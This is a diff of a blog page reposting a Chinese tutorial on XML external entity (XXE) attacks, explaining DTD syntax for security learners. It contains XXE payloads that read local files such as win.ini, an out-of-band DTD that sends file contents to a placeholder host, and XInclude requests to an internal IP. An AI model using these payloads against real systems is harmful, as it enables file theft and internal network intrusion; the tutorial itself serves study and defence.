@@ -330,7 +330,7 @@
                 
               
 
-              <time title="创建时间：2019-07-30 19:52:13 / 修改时间：20:00:46" itemprop="dateCreated datePublished" datetime="2019-07-30T19:52:13+08:00">2019-07-30</time>
+              <time title="创建时间：2019-07-30 19:52:13 / 修改时间：20:07:46" itemprop="dateCreated datePublished" datetime="2019-07-30T19:52:13+08:00">2019-07-30</time>
             </span>
           
 
@@ -374,7 +374,10 @@
       
         
           
-            <p>0×00 背景</p>
+            <h2 id="XXE学习之路-STEP-BY-STEP"><a href="#XXE学习之路-STEP-BY-STEP" class="headerlink" title="XXE学习之路-STEP BY STEP"></a>XXE学习之路-STEP BY STEP</h2><p><img src="https://image.3001.net/images/20190428/1556414288_5cc4ff50285e3.jpg" alt="img"><a href="https://www.freebuf.com/author/漏斗社区" target="_blank" rel="noopener">漏斗社区</a>2017-12-11 </p>
+<p>首发专栏：<a href="http://zhuanlan.freebuf.com/column/index/?name=潜心学习的小白帽" target="_blank" rel="noopener">潜心学习的小白帽</a>关注</p>
+<p>近期看到OWASP TOP 10 2017 版中添加了XXE的内容便对XXE的一些知识进行梳理和总结。</p>
+<p><strong>0×00 背景</strong></p>
 <p>近期看到OWASP TOP 10 2017 版中添加了XXE的内容便对XXE的一些知识进行梳理和总结，XXE可以使用例如http，file等协议，所以可以利用支持的协议进行内网探测和内网入侵，这部分的内容后续在SSRF中补充。</p>
 <p>要点：libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。 </p>
 <p>参考链接：</p>
@@ -406,12 +409,14 @@
 <!DOCTYPE 根元素 [元素声明]>
 
 <p><strong>2. DTD 外部引用</strong></p>
+<!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”>
+
 <p><strong>3. 引用公共DTD</strong></p>
-<!DOCTYPE 根元素名称 PUBLIC “DTD标识名" “公用DTD的URI">
+<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
 
 <p>示例：</p>
 <blockquote>
-<?xml version="1.0″?><p>   </p>
+<?xml version=”1.0″?><p>   </p>
 <!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN”
 
 “http://mybatis.org/dtd/mybatis-3-config.dtd”>
@@ -424,7 +429,7 @@
 </blockquote>
 <p><strong>DTD 实体声明(重点学习)：</strong></p>
 <p><strong>1. 内部实体声明</strong></p>
-<!ENTITY 实体名称 “实体的值"><p> </p>
+<!ENTITY 实体名称 “实体的值”><p> </p>
 <p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p>
 <blockquote>
 <p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
@@ -433,7 +438,7 @@
 </blockquote>
 <p><a href="https://image.3001.net/images/20171211/15129734664946.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129734664946.png!small" alt="内部.png"></a></p>
 <p><strong>2. 外部实体声明</strong></p>
-<!ENTITY 实体名称 SYSTEM “URI/URL"><p> </p>
+<!ENTITY 实体名称 SYSTEM “URI/URL”><p> </p>
 <p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p>
 <p><a href="https://image.3001.net/images/20171211/15129735161149.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129735161149.png!small" alt="外部.png"></a></p>
 <p>示例：</p>
@@ -444,9 +449,9 @@
 </blockquote>
 <p><strong>3. 参数实体声明</strong></p>
 <blockquote>
-<p>1.<!ENTITY % 实体名称 “实体的值"></p>
+<p>1.<!ENTITY % 实体名称 “实体的值”></p>
 <p>2.or</p>
-<p>3.<!ENTITY % 实体名称 SYSTEM “URI"></p>
+<p>3.<!ENTITY % 实体名称 SYSTEM “URI”></p>
 </blockquote>
 <p>示例：</p>
 <blockquote>
@@ -457,11 +462,11 @@
 </blockquote>
 <p>外部evil.dtd中的内容。</p>
 <blockquote>
-<!ENTITY evil SYSTEM “file:///c:/windows/win.ini" >
+<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
 </blockquote>
 <p><a href="https://image.3001.net/images/20171211/15129736722870.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129736722870.png!small" alt="evil.png"></a></p>
 <p><strong>4. 引用公共实体</strong></p>
-<!ENTITY 实体名称 PUBLIC “public_ID" “URI">
+<!ENTITY 实体名称 PUBLIC “public_ID” “URI”>
 
 
 
@@ -483,7 +488,7 @@
 <p>4.<foo>&evil;</foo></p>
 </blockquote>
 <p>外部evil.dtd中的内容。</p>
-<!ENTITY evil SYSTEM “file:///c:/windows/win.ini" >
+<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
 
 <p><a href="https://image.3001.net/images/20171211/1512973900504.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512973900504.png!small" alt="001.png"></a></p>
 <p>当然也可以进行内网站点的入侵(属于SSRF的内容 后续补充)。</p>
@@ -501,7 +506,7 @@
 <p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
 <blockquote>
 <p>1.&lt;!ENTITY % all</p>
-<p>\2. “<!ENTITY &#x25; send SYSTEM ‘http://xxx.xxx.xxx/?data=%file;'>”</p>
+<p>\2. “<!ENTITY &#x25; send SYSTEM ‘http://xxx.xxx.xxx/?data=%file;’>”</p>
 <p>\3. &gt;</p>
 <p>4.%all;</p>
 </blockquote>
@@ -532,7 +537,7 @@
 <p>语法：xmlns=”namespaceURI”表示默认的Namespace，可以不使用前缀；非默认的便需要使用前缀避免XML报错。 xmlns:namespace-prefix=”namespaceURI”，其中namespace-prefix为自定义前缀，只要在这个XML文档中保证前缀不重复即可；namespaceURI是这个前缀对应的XML Namespace的定义，如下例子中的xmlns:xsi表示使用xsi作为前缀的Namespace。</p>
 <p>xsi:schemaLocation属性便是Namespace为<a href="http://www.w3.org/2001/XMLSchema-instance里的schemaLocation属性。xsi:schemaLocation定义了XML" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance里的schemaLocation属性。xsi:schemaLocation定义了XML</a> Namespace和对应的 XSD（Xml Schema Definition）文档的位置的关系。它的值由一个或多个URI引用对组成，两个URI之间以空白符分隔（空格和换行均可）。第一个URI是定义的 XML Namespace的值，第二个URI给出Schema文档的位置，Schema处理器将从这个位置读取Schema文档，文档的targetNamespace必须与第一个URI相匹，具体内容如下所示：</p>
 <blockquote>
-<p>1.<?xml version="1.0″?></p>
+<p>1.<?xml version=”1.0″?></p>
 <p>2.</p>
 <p>3.&lt;note xmlns=”<a href="http://www.runoob.com”" target="_blank" rel="noopener">http://www.runoob.com”</a></p>
 <p>4.xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
@@ -553,7 +558,7 @@
 <p><strong>1. schemaLocation</strong></p>
 <p>在OWASP 的XML External Entity Attacks(XXE)议题中有看到这这个知识点，但是具体的案例并未找到，FB给出了如下的示例。</p>
 <blockquote>
-<p>1.<?xml version='1.0′?></p>
+<p>1.<?xml version=’1.0′?></p>
 <p>2.&lt;!DOCTYPE data [</p>
 <p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
 <p>4.%remote;</p>
@@ -565,7 +570,7 @@
 <p><strong>2. noNamespaceSchemaLocation</strong></p>
 <p>与<strong>schemaLocation</strong>一样，在OWASP 的XML External Entity Attacks(XXE)议题中有看到这个知识点，但是具体的案例并未找到，FB给出了如下的示例，也给出了SSRF的示例，但是在示例中总觉得有些诡异，这也是我疑惑的地方。</p>
 <blockquote>
-<p>1.<?xml version='1.0′?></p>
+<p>1.<?xml version=’1.0′?></p>
 <p>2.&lt;!DOCTYPE data [</p>
 <p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
 <p>4.%remote;</p>
@@ -579,17 +584,17 @@
 <p><a href="https://image.3001.net/images/20171211/15129745755040.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129745755040.png!small" alt="示例.png"></a></p>
 <p>freebuf的示例，如下所示：</p>
 <blockquote>
-<p>1.<?xml version="1.0″ encoding="utf-8″?></p>
+<p>1.<?xml version=”1.0″ encoding=”utf-8″?></p>
 <p>2.&lt;!DOCTYPE data [</p>
 <p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
 <p>4.%remote;</p>
 <p>5.]&gt;</p>
-<p>6.<data xmlns:xi="http://www.w3.org/2001/XInclude">&lt;xi:include href=”<a href="http://192.168.2.31/&internal;”" target="_blank" rel="noopener">http://192.168.2.31/&internal;”</a> parse=”text”&gt;</data></p>
+<p>6.<data xmlns:xi="”http://www.w3.org/2001/XInclude”">&lt;xi:include href=”<a href="http://192.168.2.31/&internal;”" target="_blank" rel="noopener">http://192.168.2.31/&internal;”</a> parse=”text”&gt;</data></p>
 </blockquote>
 <p>以上示例中<strong>external_entity_attribute.dtd</strong>文件的内容，根据示例中的参数实体payload的声明，在此处应该可以使用各种协议进行SSRF等操作。</p>
 <blockquote>
-<p>1.<!ENTITY % payload SYSTEM “file:///sys/power/image_size"></p>
-<p>2.<!ENTITY % param1 “<!ENTITY internal ‘%payload;'>”&gt;</p>
+<p>1.<!ENTITY % payload SYSTEM “file:///sys/power/image_size”></p>
+<p>2.<!ENTITY % param1 “<!ENTITY internal ‘%payload;’>”&gt;</p>
 <p>3.%param1;</p>
 </blockquote>
 <p><strong>4. XSLT 攻击</strong></p>
@@ -625,7 +630,7 @@
 <p><a href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf</a></p>
 <p><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a></p>
 <p><a href="https://github.com/BuffaloWill/oxml_xxe/tree/master/samples" target="_blank" rel="noopener">https://github.com/BuffaloWill/oxml_xxe/tree/master/samples</a></p>
-<p><a href="https://github.com/CHYbeta/Web-Security-Learning#xxe" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning#xxe</a></p>
+<p><a href="https://github.com/CHYbeta/Web-Security-Learning#xxe" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning#xxe</a>(<a href="https://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1239375517" target="_blank" rel="noopener">https://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1239375517</a></p>
 <h3 id="转载自：https-www-freebuf-com-column-156863-html"><a href="#转载自：https-www-freebuf-com-column-156863-html" class="headerlink" title="转载自：https://www.freebuf.com/column/156863.html"></a>转载自：<a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">https://www.freebuf.com/column/156863.html</a></h3>
           
         
